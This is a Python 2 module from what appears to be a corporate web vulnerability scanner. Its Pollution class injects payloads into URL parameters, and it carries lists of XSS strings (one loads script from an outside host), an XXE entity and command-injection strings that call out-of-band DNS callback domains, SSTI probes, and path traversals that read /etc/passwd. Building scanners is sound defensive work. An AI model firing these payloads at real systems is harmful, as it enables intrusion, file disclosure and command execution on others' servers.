#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import threading
import requests
import urlparse
import requests.packages.urllib3
import socket
requests.packages.urllib3.disable_warnings()

def is_port_open(func):
    # soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # socket.settimeout(3.0)
    def wrapper(*args, **kw):

        open = False
        try:
            ip = args[0]
            port = kw["port"] if "port" in kw else "80"
            soc = socket.create_connection((ip, int(port)), timeout=1.5)
            open = True
            soc.close()
        except Exception as e:
            print "[is_port_open] [error={}]".format(repr(e))

        if open:
            func(*args, **kw)
        else:
            return

    return wrapper



def is_http(ip, port):
    http = False
    try:
        a = socket.create_connection((ip, port), timeout=5)
        a.send('GET / HTTP/1.1\r\n\r\n')
        data = a.recv(30)
        if "HTTP" in data:
            http = True
        return http
    except Exception as e:
        pass
    finally:
        a.close()


# TODO: ADD PASSWORD_DIC

def http_request_post(url, payload, headers=None, timeout=10, body_content_workflow=False, allow_redirects=False, allow_ssl_verify=False):
    try:
        if not headers:
            headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com',
                        'Connection': 'Close'
                      }
        result = requests.post(url,
            data=payload,
            headers=headers,
            stream=body_content_workflow,
            timeout=timeout,
            allow_redirects=allow_redirects,
            verify=allow_ssl_verify)
        return result.status_code, result.headers, result.content
    except Exception, e:
        return -1, {}, ''

def http_request_get(url, headers=None, timeout=10, body_content_workflow=False, allow_redirects=False, allow_ssl_verify=False, time_check=None):
    try:
        if not headers:
            headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com',
                        'Connection': 'Close'
                      }
        time0 = time.time()
        result = requests.get(url,
            headers=headers,
            stream=body_content_workflow,
            timeout=timeout,
            allow_redirects=allow_redirects,
            verify=allow_ssl_verify)
        time1 = time.time()
        if time_check:
            return result.status_code, result.headers, result.content, time1-time0
        return result.status_code, result.headers, result.content
    except Exception, e:
        if time_check:
            return -1, {}, '', 0
        return -1, {}, ''



class Pollution(object):
    """
    this class aim to use the payload
    to the param in requests
    """
    def __init__(self, query, payloads, pollution_all=False, isjson=False, replace=True):
        """
        :query: the url query part
        :payloads:  List, the payloads to added in params
        :data: if url is POST, the data is the post data
        """
        self.payloads = payloads
        self.query = query
        self.isjson = isjson
        self.replace = replace
        self.pollution_all = pollution_all
        self.polluted_urls = []

        if type(self.payloads) != list:
            self.payloads = [self.payloads,]

    def pollut(self):
        if self.isjson:
            query_dict = dict(urlparse.parse_qsl(self.query, keep_blank_values=True))
        else:
            try:
                query_dict = dict(urlparse.parse_qsl(self.query, keep_blank_values=True))
            except Exception as e:
                print 'Pollrepr(e)={}'.format(repr(e))
                return
        for key in query_dict.keys():
            for payload in self.payloads:
                tmp_qs = query_dict.copy()
                if self.replace:
                    tmp_qs[key] = payload
                else:
                    tmp_qs[key] = tmp_qs[key] + payload
                print tmp_qs
                self.polluted_urls.append(tmp_qs)

    def payload_generate(self):
        #print self.payloads
        if self.pollution_all:
            pass
        else:
            self.pollut()
            return self.polluted_urls

XSS_PAYLOAD = [
        "`';!--\"<XSS>=&{()}",
        "&\"]}alert();{//",
        "\"'><svg onload=confirm()1)>",
        "<svg onload=alert(1)>",
        "\" onfous=alert(1)\"><\"", # 事件
        "<video><source onerror=\"alert(1)\">", # H5 payload
        "</textarea>'\"});<script src=http://xss.niufuren.cc/QHDPCg?1526457930></script>"
    ]

XXE_PAYLOAD = [
    '<?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM "http://xxe_{domain}.devil.dns.yoyostay.top/xxe"> ]> <r>&sp;</r>',
    ]

SSTI_PAYLOAD = ["{{159753 * 357951}}", "${{159753 * 357951}}"]


LFI_PAYLOAD = [
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",#    {tag="root:x:"}
        "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",#                    {tag="root:x:"}
        "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",#    {tag="root:x:"}
        "/././././././././././././././././././././././././../../../../../../../../etc/passwd", #              {tag="root:x:"}
        "/etc/passwd", #    {tag="root:x:"}
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",#    {tag="root:x:"}
        "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",#                    {tag="root:x:"}
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",#    {tag="root:x:"}
        # "././././././././././././././././././././././././../../../../../../../../etc/passwd", #              {tag="root:x:"}
        # "/etc/passwd", #    {tag="root:x:"}
        # 还可以加入RFI
    ]

COMMAND_PAYLOAD = [
    ";nslookup ci_{domain}.devil.dns.yoyostay.top",
    '&nslookup ci_{domain}.devil.dns.yoyostay.top&\'\\"`0&nslookup ci_{domain}.devil.dns.yoyostay.top&`\'',
    "nslookup ci_{domain}.devil.dns.yoyostay.top|nslookup ci_{domain}.devil.dns.yoyostay.top&nslookup ci_{domain}.devil.dns.yoyostay.top",
    ";nslookup ci_{domain}.devil.dns.yoyostay.top|nslookup ci_{domain}.devil.dns.yoyostay.top&nslookup ci_{domain}.devil.dns.yoyostay.top;"
    "$(nslookup ci_{domain}.devil.dns.yoyostay.top)",
    "';nslookup ci_{domain}.devil.dns.yoyostay.top'",
    "'&nslookup ci_{domain}.devil.dns.yoyostay.top'",
    "'|nslookup ci_{domain}.devil.dns.yoyostay.top'",
    "'||nslookup ci_{domain}.devil.dns.yoyostay.top'",
    "'$(nslookup ci_{domain}.devil.dns.yoyostay.top)'",
    "\";nslookup ci_{domain}.devil.dns.yoyostay.top\"",
    "\"&nslookup ci_{domain}.devil.dns.yoyostay.top\"",
    "\"|nslookup ci_{domain}.devil.dns.yoyostay.top\"",
    "\"||nslookup ci_{domain}.devil.dns.yoyostay.top\"",
    "\"$(nslookup ci_{domain}.devil.dns.yoyostay.top)\""
]

def getPayload(query, types):
    if types == 'xss':
        return Pollution(query, XSS_PAYLOAD).payload_generate()
    if types == 'ssti':
        return Pollution(query, SSTI_PAYLOAD).payload_generate()
    if types == 'xxe':
        return Pollution(query, XXE_PAYLOAD).payload_generate()
    if types == 'lfi':
        return Pollution(query, LFI_PAYLOAD).payload_generate()

    if types == 'ci':
        return Pollution(query, COMMAND_PAYLOAD).payload_generate()

